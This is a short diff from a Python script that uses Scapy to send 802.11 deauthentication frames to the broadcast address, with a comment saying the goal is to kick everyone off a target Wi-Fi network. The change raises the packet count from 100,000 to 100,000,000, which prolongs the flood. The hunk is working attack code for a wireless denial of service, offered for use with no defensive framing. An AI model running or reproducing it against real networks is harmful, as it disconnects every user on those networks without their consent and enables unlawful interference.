@@ -42,7 +42,7 @@ try:
                 #Addr2 is the target addr
                 #Addr3 is used to target specific clients but I set it to the target addr to kick everyone off the network	
 		pkt = RadioTap() / Dot11(addr1=brdMac, addr2=BSSID, addr3=BSSID)/ Dot11Deauth()
-		sendp(pkt, iface = networkCard, count = 100000, inter = .0001) #Send deauth packet
+		sendp(pkt, iface = networkCard, count = 100000000, inter = .001) #Send deauth packet
 except KeyboardInterrupt: #Caputer the user pressing crtl+c to exit the program. Then the code stops monitor mode on the network card and closes out
 	print('Cleaning up...')
 	subprocess.call('airmon-ng stop {}'.format(networkCard), shell=True) #stop monitor mode on the network card
